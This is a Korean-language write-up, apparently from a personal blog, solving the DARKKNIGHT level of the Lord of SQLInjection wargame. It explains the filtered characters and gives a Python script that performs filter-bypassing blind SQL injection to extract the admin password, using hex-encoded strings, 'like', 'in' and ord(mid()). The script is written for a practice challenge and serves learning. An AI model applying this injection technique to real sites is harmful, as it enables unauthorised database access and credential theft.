---
title: "Lord of SQLInjection - DARKKNIGHT"
categories: 
  - SQLi
tags:
  - SQLi
  - 웹해킹
toc: true
---

# DARKKNIGHT
## 문제
![img](/assets/images/los/darkknight1.png)

- 따옴표('), substr, ascii, = 문자를 필터링한다.
- 따옴표를 사용할 수 없기 때문에 no를 통해서 admin의 패스워드를 추출할 수 있다.

## 정답

![img](/assets/images/los/darkknight2.png)

![img](/assets/images/los/darkknight3.png)

```python
import requests

password = ''

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

cookie = {'PHPSESSID' : 'PHP 세션 아이디'}

pass_len = 0

for length in range(1,30):
    query = "?pw=1&no=0 or id like 0x61646d696e and %d in (length(pw))" %length
    URL = url+query

    r = requests.get(url=URL, cookies=cookie)

    if 'Hello admin' in str(r.content):
        pass_len = length
        break

    else:
        print(str(length) + "--- X")
		

print("password length : %d" %pass_len)
password=''

for i in range(1, pass_len+1):
    for j in range(38, 127):
        query = "?pw=1&no=0 or id like 0x61646d696e and ord(mid(pw,%d,1)) in (%d) %%23" %(i, j)
        URL = url+query
        r = requests.get(url=URL, cookies=cookie)
        
        if 'Hello admin' in str(r.content):
            password += chr(j)
            break

print ('passowrd :  %s' %password)
```